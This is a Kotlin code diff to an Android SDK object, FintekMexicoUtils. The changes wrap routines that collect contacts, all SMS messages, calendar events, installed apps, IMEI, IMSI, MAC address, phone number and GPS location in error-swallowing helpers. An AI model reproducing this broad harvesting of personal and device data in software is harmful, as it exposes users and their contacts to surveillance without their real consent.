@@ -33,8 +33,13 @@ import com.fintek.utils_androidx.thread.ThreadUtils
 import com.fintek.utils_mexico.albs.AlbsUtils
 import com.fintek.utils_mexico.battery.BatteryMexicoUtils
 import com.fintek.utils_mexico.boardcastReceiver.NetworkBroadcastReceiver
+import com.fintek.utils_mexico.date.DateMexicoUtils
 import com.fintek.utils_mexico.device.DeviceMexicoUtils
 import com.fintek.utils_mexico.device.SensorMexicoUtils
+import com.fintek.utils_mexico.ext.catchOrEmpty
+import com.fintek.utils_mexico.ext.catchOrLong
+import com.fintek.utils_mexico.ext.catchOrZero
+import com.fintek.utils_mexico.ext.safely
 import com.fintek.utils_mexico.language.LanguageMexicoUtils
 import com.fintek.utils_mexico.location.LocationMexicoUtils
 import com.fintek.utils_mexico.model.*
@@ -68,10 +73,15 @@ object FintekMexicoUtils {
         if (spGaid.isNotEmpty()) {
             gaid = spGaid
         }
-        application.registerReceiver(NetworkBroadcastReceiver(), IntentFilter().apply {
-            addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
-        })
-        NetworkMexicoUtils.wifiManager.startScan()
+
+        safely {
+            application.registerReceiver(NetworkBroadcastReceiver(), IntentFilter().apply {
+                addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
+            })
+        }
+        safely {
+            NetworkMexicoUtils.wifiManager.startScan()
+        }
         DeviceUtils.getGaid(object : FintekUtils.Consumer<String> {
             override fun accept(t: String) {
                 gaid = t
@@ -88,7 +98,7 @@ object FintekMexicoUtils {
         Manifest.permission.ACCESS_COARSE_LOCATION,
     ])
     fun registerLocationListener() {
-        locationUtils.registerLocationListener()
+        safely { locationUtils.registerLocationListener() }
     }
 
     @JvmStatic
@@ -97,7 +107,7 @@ object FintekMexicoUtils {
         Manifest.permission.ACCESS_COARSE_LOCATION,
     ])
     fun unregisterLocationListener() {
-        locationUtils.unregisterLocationListener()
+        safely { locationUtils.unregisterLocationListener() }
     }
 
     fun fetchLocationData() = locationUtils.getLocationData()
@@ -143,7 +153,7 @@ object FintekMexicoUtils {
             buildId = AppUtils.getAppVersionCode().toString(),
             buildName = AppUtils.getAppVersionName(),
             contactGroup = ContactQueryUtils.getContactGroupCount(),
-            createTime = DateUtils.getCurrentDateTime(),
+            createTime = DateMexicoUtils.getCurrentDateTime(),
             downloadFiles = DownloadQueryUtils.getDownloadFileCount(),
             imagesExternal = ImageQueryUtils.getExternalImageCount(),
             imagesInternal = ImageQueryUtils.getInternalImageCount(),
@@ -151,16 +161,16 @@ object FintekMexicoUtils {
             videoExternal = VideoQueryUtils.getExternalVideoCount(),
             videoInternal = VideoQueryUtils.getInternalVideoCount(),
             gpsAdid = gaid,
-            deviceId = DeviceUtils.getDeviceIdentify(true).orEmpty(),
+            deviceId = DeviceMexicoUtils.getDeviceIdentify(),
             deviceInfo = HardwareUtils.getDevice(),
             osType = "android",
             osVersion = Build.VERSION.SDK_INT.toString(),
-            ip = NetworkUtils.getIpAddressByWifi(),
-            memory = Formatter.formatFileSize(requiredApplication, RuntimeMemoryUtils.getTotalMemory()),
-            storage = StorageMexicoUtils.getTotalStorageSize(),
-            unUseStorage = StorageMexicoUtils.getUnuseStorageSize(),
-            gpsLatitude = data?.location?.latitude?.toString(),
-            gpsLongitude = data?.location?.longitude?.toString(),
+            ip = NetworkMexicoUtils.getIpAddressByWifi(),
+            memory = catchOrEmpty("-1") { Formatter.formatFileSize(requiredApplication, RuntimeMemoryUtils.getTotalMemory()) },
+            storage = catchOrEmpty("-1") { StorageMexicoUtils.getTotalStorageSize() },
+            unUseStorage = catchOrEmpty("-1") { StorageMexicoUtils.getUnuseStorageSize() },
+            gpsLatitude = data?.location?.latitude?.toString().orEmpty(),
+            gpsLongitude = data?.location?.longitude?.toString().orEmpty(),
             gpsAddress = LocationMexicoUtils.getAddress(data?.location).orEmpty(),
             addressInfo = LocationMexicoUtils.getAddressDetail(data?.location).orEmpty(),
             isWifi = NetworkMexicoUtils.isWifiEnable(),
@@ -172,8 +182,8 @@ object FintekMexicoUtils {
             picCount = ImageQueryUtils.getExternalImageCount() + ImageQueryUtils.getInternalImageCount(),
             imsi = DeviceMexicoUtils.getImsi(),
             mac = MacUtils.getMacAddress(),
-            sdCard = SDCardMexicoUtils.getSDCardTotalSize(),
-            unUseSdCard = SDCardMexicoUtils.getSDCardAvailableSize(),
+            sdCard = catchOrEmpty("-1") { SDCardMexicoUtils.getSDCardTotalSize() },
+            unUseSdCard = catchOrEmpty("-1") { SDCardMexicoUtils.getSDCardAvailableSize() },
             idfa = "",
             idfv = "",
             ime = DeviceUtils.getImei().orEmpty(),
@@ -185,59 +195,79 @@ object FintekMexicoUtils {
     @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
     @RequiresPermission(Manifest.permission.READ_CONTACTS)
     fun getContacts(): List<Contact> {
-        val contacts = ContactUtils.getContacts()
-        val transformList = mutableListOf<Contact>()
-        contacts.asSequence().forEach {
-            when(it.phone?.size) {
-                0 -> transformList.add(
-                    Contact(
-                        name = it.name.orEmpty(),
-                        phoneNumber = "",
-                        updateTime = it.upTime?.toLong() ?: 0L,
-                        lastTimeContacted = it.lastTimeContacted.toLong(),
-                        timesContacted = it.timesContacted
-                    )
-                )
-                1 -> transformList.add(
-                    Contact(
-                        name = it.name.orEmpty(),
-                        phoneNumber = it.phone?.get(0).orEmpty(),
-                        updateTime = it.upTime?.toLong() ?: 0L,
-                        lastTimeContacted = it.lastTimeContacted.toLong(),
-                        timesContacted = it.timesContacted
-                    )
-                )
-                else -> transformList.addAll(
-                    it.phone?.map { internalPhone ->
+        return try {
+            val contacts = ContactUtils.getContacts()
+            val transformList = mutableListOf<Contact>()
+            contacts.asSequence().forEach {
+                when(it.phone?.size) {
+                    0 -> transformList.add(
                         Contact(
                             name = it.name.orEmpty(),
-                            phoneNumber = internalPhone,
+                            phoneNumber = "",
                             updateTime = it.upTime?.toLong() ?: 0L,
                             lastTimeContacted = it.lastTimeContacted.toLong(),
                             timesContacted = it.timesContacted
                         )
-                    } ?: emptyList()
-                )
+                    )
+                    1 -> transformList.add(
+                        Contact(
+                            name = it.name.orEmpty(),
+                            phoneNumber = it.phone?.get(0).orEmpty(),
+                            updateTime = it.upTime?.toLong() ?: 0L,
+                            lastTimeContacted = it.lastTimeContacted.toLong(),
+                            timesContacted = it.timesContacted
+                        )
+                    )
+                    else -> transformList.addAll(
+                        it.phone?.map { internalPhone ->
+                            Contact(
+                                name = it.name.orEmpty(),
+                                phoneNumber = internalPhone,
+                                updateTime = it.upTime?.toLong() ?: 0L,
+                                lastTimeContacted = it.lastTimeContacted.toLong(),
+                                timesContacted = it.timesContacted
+                            )
+                        } ?: emptyList()
+                    )
+                }
             }
+            transformList
+        } catch (e: Exception) {
+            emptyList()
+        } catch (e: Throwable) {
+            emptyList()
         }
-        return transformList
     }
 
     @JvmStatic
-    fun getApps(): List<App> {
-       return PackageUtils.getAllPackage(AppMexicoStructHandler())
+    fun getApps(): List<App> = try {
+        PackageUtils.getAllPackage(AppMexicoStructHandler())
+    } catch (e: Exception) {
+        emptyList()
+    } catch (e: Throwable) {
+        emptyList()
     }
 
     @JvmStatic
     @RequiresApi(Build.VERSION_CODES.KITKAT)
     @RequiresPermission(anyOf = [Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS])
-    fun getSms(): List<Sms> {
-        return SmsUtils.getAllSms(projection = SmsMexicoStructHandler())
+    fun getSms(): List<Sms> = try {
+        SmsUtils.getAllSms(projection = SmsMexicoStructHandler())
+    } catch (e: Exception) {
+        emptyList()
+    } catch (e: Throwable) {
+        emptyList()
     }
 
     @JvmStatic
     @RequiresPermission(Manifest.permission.READ_CALENDAR)
-    fun getCalendar(): List<Calendar> = CalendarEventUtils.getCalendar(CalendarMexicoStructHandler())
+    fun getCalendar(): List<Calendar> = try {
+        CalendarEventUtils.getCalendar(CalendarMexicoStructHandler())
+    } catch (e: Exception) {
+        emptyList()
+    } catch (e: Throwable) {
+        emptyList()
+    }
 
     private fun getBatteryStatus() = BatteryStatus(
         batteryLevel = BatteryMexicoUtils.getBatteryRemainder(),
@@ -250,7 +280,7 @@ object FintekMexicoUtils {
 
     @SuppressLint("MissingPermission", "NewApi")
     private fun getGeneralData() = GeneralData(
-        androidId = DeviceUtils.getAndroidId(),
+        androidId = DeviceMexicoUtils.getAndroidId(),
         currentSystemTime = System.currentTimeMillis(),
         elapsedRealtime = SystemClock.elapsedRealtime(),
         gaid = gaid,
@@ -267,11 +297,11 @@ object FintekMexicoUtils {
         networkType = NetworkMexicoUtils.getNetworkType(),
         networkTypeNew = NetworkMexicoUtils.getNetworkType(),
         phoneNumber = PhoneUtils.getPhoneNumber(),
-        phoneType = PhoneUtils.getPhoneType(),
+        phoneType = catchOrZero { PhoneUtils.getPhoneType() },
         sensor = SensorMexicoUtils.getSensors(),
         timeZoneId = PhoneUtils.getTimeZoneId().toIntOrNull() ?: 1,
         uptimeMillis = SystemClock.uptimeMillis(),
-        uuid = DeviceUtils.getUniquePseudoId()
+        uuid = catchOrEmpty { DeviceUtils.getUniquePseudoId() }
     )
 
     private fun getHardware() = Hardware(
@@ -279,7 +309,7 @@ object FintekMexicoUtils {
         brand = HardwareUtils.getBrand(),
         cores = ThreadUtils.getCpuCount(),
         deviceHeight = HardwareUtils.getPhysicalHeight(),
-        deviceName = DeviceUtils.getDeviceName(),
+        deviceName = catchOrEmpty { DeviceUtils.getDeviceName() },
         deviceWidth = HardwareUtils.getPhysicalWidth(),
         model = HardwareUtils.getModel(),
         physicalSize = HardwareUtils.getPhysicalInch().toString(),
@@ -303,8 +333,8 @@ object FintekMexicoUtils {
 
     @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
     private fun getOtherData() = OtherData(
-        dbm = DeviceUtils.getMobileDbm().toString(),
-        keyboard = DeviceUtils.getCurrentKeyboardType(),
+        dbm = DeviceMexicoUtils.getMobileDbm().toString(),
+        keyboard = DeviceMexicoUtils.getCurrentKeyboardType(),
         lastBootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime(),
         isRoot = DeviceMexicoUtils.isRoot(),
         isSimulator = DeviceMexicoUtils.isSimulator()
@@ -312,18 +342,18 @@ object FintekMexicoUtils {
 
     @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
     private fun getStorage() = Storage(
-        appFreeMemory = RuntimeMemoryUtils.getAppFreeMemory().toString(),
-        appMaxMemory = RuntimeMemoryUtils.getAppMaxMemory().toString(),
-        appTotalMemory = RuntimeMemoryUtils.getAppTotalMemory().toString(),
+        appFreeMemory = catchOrEmpty { RuntimeMemoryUtils.getAppFreeMemory().toString() },
+        appMaxMemory = catchOrEmpty { RuntimeMemoryUtils.getAppMaxMemory().toString() },
+        appTotalMemory = catchOrEmpty { RuntimeMemoryUtils.getAppTotalMemory().toString() },
         containSd = SDCardMexicoUtils.isContainSDCard(),
         extraSd = SDCardMexicoUtils.isExtraSDCard(),
-        internalStorageTotal = StorageUtils.internalTotalStorageSize(),
-        internalStorageUsable = StorageUtils.internalAvailableStorageSize(),
-        memoryCardSize = SDCardMexicoUtils.getTotalSize(),
-        memoryCardFreeSize = SDCardMexicoUtils.getSDCardFreeSize(),
-        memoryCardUsedSize = SDCardMexicoUtils.getUsedSize(),
-        memoryCardUsableSize = SDCardMexicoUtils.getAvailableSize(),
-        ramTotalSize = RuntimeMemoryUtils.getTotalMemory().toString(),
-        ramUsableSize = RuntimeMemoryUtils.getAvailableMemory().toString()
+        internalStorageTotal = catchOrLong { StorageUtils.internalTotalStorageSize() },
+        internalStorageUsable = catchOrLong { StorageUtils.internalAvailableStorageSize() },
+        memoryCardSize = catchOrLong(-1) { SDCardMexicoUtils.getTotalSize() },
+        memoryCardFreeSize = catchOrLong(-1) { SDCardMexicoUtils.getSDCardFreeSize() },
+        memoryCardUsedSize = catchOrLong(-1) { SDCardMexicoUtils.getUsedSize() },
+        memoryCardUsableSize = catchOrLong(-1) { SDCardMexicoUtils.getAvailableSize() },
+        ramTotalSize = catchOrEmpty { RuntimeMemoryUtils.getTotalMemory().toString() },
+        ramUsableSize = catchOrEmpty { RuntimeMemoryUtils.getAvailableMemory().toString() }
     )
 }
